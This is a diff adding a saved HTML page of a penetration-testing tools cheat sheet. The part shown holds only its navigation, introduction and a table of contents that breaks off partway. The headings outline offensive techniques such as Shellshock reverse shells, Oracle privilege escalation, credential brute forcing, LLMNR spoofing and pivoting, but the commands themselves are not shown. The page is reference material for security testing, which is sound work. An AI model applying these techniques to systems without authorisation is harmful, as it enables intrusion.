@@ -1,0 +1,3908 @@
+<!DOCTYPE html>
+<!-- saved from url=(0065)https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ -->
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script async="" data-rocketsrc="https://www.google-analytics.com/analytics.js" data-rocketoptimized="true"></script><script type="text/javascript" src="https://www.google-analytics.com/analytics.js"></script><script src="./Penetration Testing Tools Cheat Sheet_files/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><script type="text/javascript">
+//<![CDATA[
+window.__cfRocketOptions = {byc:0,p:0,petok:"27637226c83d3ad4c424f7ce08487aa6b933f981-1522501392-1800"};
+//]]>
+</script>
+<script type="text/javascript" src="./Penetration Testing Tools Cheat Sheet_files/rocket.min.js"></script><style></style>
+<link rel="canonical" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">
+<title>Penetration Testing Tools Cheat Sheet</title>
+<meta name="description" content="Penetration testing tools cheat sheet, a high level overview / quick reference cheat sheet for penetration testing.">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="./Penetration Testing Tools Cheat Sheet_files/css">
+<link rel="stylesheet" type="text/css" href="./Penetration Testing Tools Cheat Sheet_files/screen.css">
+<link href="./Penetration Testing Tools Cheat Sheet_files/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async="" defer="" data-rocketsrc="https://buttons.github.io/buttons.js" type="text/rocketscript" data-rocketoptimized="true"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="./Penetration Testing Tools Cheat Sheet_files/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH &amp; Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+Penetration Testing Tools Cheat Sheet
+<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+cheat-sheet
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+17 Feb 2017
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="./Penetration Testing Tools Cheat Sheet_files/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<h2 id="introduction">Introduction<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#introduction"><i class="fa fa-link"></i></a></h2>
+<p><strong>Penetration testing tools cheat sheet</strong>, a quick reference high level overview for typical <a href="https://www.aptive.co.uk/penetration-testing/">penetration testing</a> engagements. Designed as a quick reference cheat sheet providing a high level overview of the <strong>typical</strong> commands you would run when performing a penetration test. For more in depth information I’d recommend the man file for the tool or a more specific pen testing cheat sheet from the menu on the right.</p>
+<p>The focus of this cheat sheet is infrastructure / network penetration testing, web application penetration testing is not covered here apart from a few sqlmap commands at the end and some web server enumeration.</p>
+<p>If I’m missing any pen testing tools here give me a nudge on twitter.</p>
+<h3 id="changelog">Changelog<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#changelog"><i class="fa fa-link"></i></a></h3>
+<p>17/02/2017 - Article updated, added loads more content, VPN, DNS tunneling, VLAN hopping etc - check out the TOC below.</p>
+<ul id="markdown-toc">
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#introduction" id="markdown-toc-introduction">Introduction</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#changelog" id="markdown-toc-changelog">Changelog</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pre-engagement" id="markdown-toc-pre-engagement">Pre-engagement</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#network-configuration" id="markdown-toc-network-configuration">Network Configuration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#set-ip-address" id="markdown-toc-set-ip-address">Set IP Address</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#subnetting" id="markdown-toc-subnetting">Subnetting</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#osint" id="markdown-toc-osint">OSINT</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#passive-information-gathering" id="markdown-toc-passive-information-gathering">Passive Information Gathering</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns" id="markdown-toc-dns">DNS</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#whois-enumeration" id="markdown-toc-whois-enumeration">WHOIS enumeration</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#perform-dns-ip-lookup" id="markdown-toc-perform-dns-ip-lookup">Perform DNS IP Lookup</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#perform-mx-record-lookup" id="markdown-toc-perform-mx-record-lookup">Perform MX Record Lookup</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#perform-zone-transfer-with-dig" id="markdown-toc-perform-zone-transfer-with-dig">Perform Zone Transfer with DIG</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns-zone-transfers" id="markdown-toc-dns-zone-transfers">DNS Zone Transfers</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#email" id="markdown-toc-email">Email</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#simply-email" id="markdown-toc-simply-email">Simply Email</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#semi-active-information-gathering" id="markdown-toc-semi-active-information-gathering">Semi Active Information Gathering</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#basic-finger-printing" id="markdown-toc-basic-finger-printing">Basic Finger Printing</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#banner-grabbing-with-nc" id="markdown-toc-banner-grabbing-with-nc">Banner grabbing with NC</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#active-information-gathering" id="markdown-toc-active-information-gathering">Active Information Gathering</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns-bruteforce" id="markdown-toc-dns-bruteforce">DNS Bruteforce</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dnsrecon" id="markdown-toc-dnsrecon">DNSRecon</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#port-scanning" id="markdown-toc-port-scanning">Port Scanning</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nmap-commands" id="markdown-toc-nmap-commands">Nmap Commands</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nmap-udp-scanning" id="markdown-toc-nmap-udp-scanning">Nmap UDP Scanning</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#udp-protocol-scanner" id="markdown-toc-udp-protocol-scanner">UDP Protocol Scanner</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#other-host-discovery" id="markdown-toc-other-host-discovery">Other Host Discovery</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#enumeration--attacking-network-services" id="markdown-toc-enumeration--attacking-network-services">Enumeration &amp; Attacking Network Services</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#samb--smb--windows-domain-enumeration" id="markdown-toc-samb--smb--windows-domain-enumeration">SAMB / SMB / Windows Domain Enumeration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#samba-enumeration" id="markdown-toc-samba-enumeration">Samba Enumeration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#smb-enumeration-tools" id="markdown-toc-smb-enumeration-tools">SMB Enumeration Tools</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#fingerprint-smb-version" id="markdown-toc-fingerprint-smb-version">Fingerprint SMB Version</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#find-open-smb-shares" id="markdown-toc-find-open-smb-shares">Find open SMB Shares</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#enumerate-smb-users" id="markdown-toc-enumerate-smb-users">Enumerate SMB Users</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#manual-null-session-testing" id="markdown-toc-manual-null-session-testing">Manual Null session testing:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nbtscan-unixwiz" id="markdown-toc-nbtscan-unixwiz">NBTScan unixwiz</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#llmnr--nbt-ns-spoofing" id="markdown-toc-llmnr--nbt-ns-spoofing">LLMNR / NBT-NS Spoofing</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-llmnr--netbios-requests" id="markdown-toc-metasploit-llmnr--netbios-requests">Metasploit LLMNR / NetBIOS requests</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#responderpy" id="markdown-toc-responderpy">Responder.py</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#snmp-enumeration-tools" id="markdown-toc-snmp-enumeration-tools">SNMP Enumeration Tools</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#snmpv3-enumeration-tools" id="markdown-toc-snmpv3-enumeration-tools">SNMPv3 Enumeration Tools</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#r-services-enumeration" id="markdown-toc-r-services-enumeration">R Services Enumeration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rsh-enumeration" id="markdown-toc-rsh-enumeration">RSH Enumeration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rsh-run-commands" id="markdown-toc-rsh-run-commands">RSH Run Commands</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-rsh-login-scanner" id="markdown-toc-metasploit-rsh-login-scanner">Metasploit RSH Login Scanner</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rusers-show-logged-in-users" id="markdown-toc-rusers-show-logged-in-users">rusers Show Logged in Users</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rusers-scan-whole-subnet" id="markdown-toc-rusers-scan-whole-subnet">rusers scan whole Subnet</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#finger-enumeration" id="markdown-toc-finger-enumeration">Finger Enumeration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#finger-a-specific-username" id="markdown-toc-finger-a-specific-username">Finger a Specific Username</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#solaris-bug-that-shows-all-logged-in-users" id="markdown-toc-solaris-bug-that-shows-all-logged-in-users">Solaris bug that shows all logged in users:</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rwho" id="markdown-toc-rwho">rwho</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#tls--ssl-testing" id="markdown-toc-tls--ssl-testing">TLS &amp; SSL Testing</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#testsslsh" id="markdown-toc-testsslsh">testssl.sh</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#vulnerability-assessment" id="markdown-toc-vulnerability-assessment">Vulnerability Assessment</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#database-penetration-testing" id="markdown-toc-database-penetration-testing">Database Penetration Testing</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#oracle" id="markdown-toc-oracle">Oracle</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#fingerprint-oracle-tns-version" id="markdown-toc-fingerprint-oracle-tns-version">Fingerprint Oracle TNS Version</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#brute-force-oracle-user-accounts" id="markdown-toc-brute-force-oracle-user-accounts">Brute force oracle user accounts</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#oracle-privilege-escalation" id="markdown-toc-oracle-privilege-escalation">Oracle Privilege Escalation</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#identify-default-accounts-within-oracle-db-using-nmap-nse-scripts" id="markdown-toc-identify-default-accounts-within-oracle-db-using-nmap-nse-scripts">Identify default accounts within oracle db using NMAP NSE scripts:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#how-to-identify-the-current-privilege-level-for-an-oracle-user" id="markdown-toc-how-to-identify-the-current-privilege-level-for-an-oracle-user">How to identify the current privilege level for an oracle user:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#oracle-priv-esc-and-obtain-dba-access" id="markdown-toc-oracle-priv-esc-and-obtain-dba-access">Oracle priv esc and obtain DBA access:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#run-the-exploit-with-a-select-query" id="markdown-toc-run-the-exploit-with-a-select-query">Run the exploit with a select query:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#remove-the-exploit-using" id="markdown-toc-remove-the-exploit-using">Remove the exploit using:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#get-oracle-reverse-os-shell" id="markdown-toc-get-oracle-reverse-os-shell">Get Oracle Reverse os-shell:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#mssql" id="markdown-toc-mssql">MSSQL</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#bruteforce-mssql-login" id="markdown-toc-bruteforce-mssql-login">Bruteforce MSSQL Login</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-mssql-shell" id="markdown-toc-metasploit-mssql-shell">Metasploit MSSQL Shell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#network" id="markdown-toc-network">Network</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#plinkexe-tunnel" id="markdown-toc-plinkexe-tunnel">Plink.exe Tunnel</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pivoting" id="markdown-toc-pivoting">Pivoting</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ssh-pivoting" id="markdown-toc-ssh-pivoting">SSH Pivoting</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#meterpreter-pivoting" id="markdown-toc-meterpreter-pivoting">Meterpreter Pivoting</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ttl-finger-printing" id="markdown-toc-ttl-finger-printing">TTL Finger Printing</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ipv4-cheat-sheets" id="markdown-toc-ipv4-cheat-sheets">IPv4 Cheat Sheets</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#classful-ip-ranges" id="markdown-toc-classful-ip-ranges">Classful IP Ranges</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ipv4-private-address-ranges" id="markdown-toc-ipv4-private-address-ranges">IPv4 Private Address Ranges</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ipv4-subnet-cheat-sheet" id="markdown-toc-ipv4-subnet-cheat-sheet">IPv4 Subnet Cheat Sheet</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#vlan-hopping" id="markdown-toc-vlan-hopping">VLAN Hopping</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#vpn-pentesting-tools" id="markdown-toc-vpn-pentesting-tools">VPN Pentesting Tools</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ikeforce" id="markdown-toc-ikeforce">IKEForce</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ike-aggressive-mode-psk-cracking" id="markdown-toc-ike-aggressive-mode-psk-cracking">IKE Aggressive Mode PSK Cracking</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-1-idenitfy-ike-servers" id="markdown-toc-step-1-idenitfy-ike-servers">Step 1: Idenitfy IKE Servers</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-2-enumerate-group-name-with-ikeforce" id="markdown-toc-step-2-enumerate-group-name-with-ikeforce">Step 2: Enumerate group name with IKEForce</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-3-use-ike-scan-to-capture-the-psk-hash" id="markdown-toc-step-3-use-ike-scan-to-capture-the-psk-hash">Step 3: Use ike-scan to capture the PSK hash</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-4-use-psk-crack-to-crack-the-psk-hash" id="markdown-toc-step-4-use-psk-crack-to-crack-the-psk-hash">Step 4: Use psk-crack to crack the PSK hash</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pptp-hacking" id="markdown-toc-pptp-hacking">PPTP Hacking</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nmap-pptp-fingerprint" id="markdown-toc-nmap-pptp-fingerprint">NMAP PPTP Fingerprint:</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pptp-dictionary-attack" id="markdown-toc-pptp-dictionary-attack">PPTP Dictionary Attack</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns-tunneling" id="markdown-toc-dns-tunneling">DNS Tunneling</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#attacking-machine" id="markdown-toc-attacking-machine">Attacking Machine</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#bof--exploit" id="markdown-toc-bof--exploit">BOF / Exploit</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploit-research" id="markdown-toc-exploit-research">Exploit Research</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#searching-for-exploits" id="markdown-toc-searching-for-exploits">Searching for Exploits</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compiling-windows-exploits-on-kali" id="markdown-toc-compiling-windows-exploits-on-kali">Compiling Windows Exploits on Kali</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cross-compiling-exploits" id="markdown-toc-cross-compiling-exploits">Cross Compiling Exploits</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploiting-common-vulnerabilities" id="markdown-toc-exploiting-common-vulnerabilities">Exploiting Common Vulnerabilities</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploiting-shellshock" id="markdown-toc-exploiting-shellshock">Exploiting Shellshock</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cat-file-view-file-contents" id="markdown-toc-cat-file-view-file-contents">cat file (view file contents)</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#shell-shock-run-bind-shell" id="markdown-toc-shell-shock-run-bind-shell">Shell Shock run bind shell</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#shell-shock-reverse-shell" id="markdown-toc-shell-shock-reverse-shell">Shell Shock reverse Shell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#simple-local-web-servers" id="markdown-toc-simple-local-web-servers">Simple Local Web Servers</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#mounting-file-shares" id="markdown-toc-mounting-file-shares">Mounting File Shares</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#http--https-webserver-enumeration" id="markdown-toc-http--https-webserver-enumeration">HTTP / HTTPS Webserver Enumeration</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#packet-inspection" id="markdown-toc-packet-inspection">Packet Inspection</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#username-enumeration" id="markdown-toc-username-enumeration">Username Enumeration</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#smb-user-enumeration" id="markdown-toc-smb-user-enumeration">SMB User Enumeration</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#snmp-user-enumeration" id="markdown-toc-snmp-user-enumeration">SNMP User Enumeration</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#passwords" id="markdown-toc-passwords">Passwords</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#wordlists" id="markdown-toc-wordlists">Wordlists</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#brute-forcing-services" id="markdown-toc-brute-forcing-services">Brute Forcing Services</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hydra-ftp-brute-force" id="markdown-toc-hydra-ftp-brute-force">Hydra FTP Brute Force</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hydra-pop3-brute-force" id="markdown-toc-hydra-pop3-brute-force">Hydra POP3 Brute Force</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hydra-smtp-brute-force" id="markdown-toc-hydra-smtp-brute-force">Hydra SMTP Brute Force</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#password-cracking" id="markdown-toc-password-cracking">Password Cracking</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#john-the-ripper---jtr" id="markdown-toc-john-the-ripper---jtr">John The Ripper - JTR</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#windows-penetration-testing-commands" id="markdown-toc-windows-penetration-testing-commands">Windows Penetration Testing Commands</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#linux-penetration-testing-commands" id="markdown-toc-linux-penetration-testing-commands">Linux Penetration Testing Commands</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compiling-exploits" id="markdown-toc-compiling-exploits">Compiling Exploits</a> <ul>
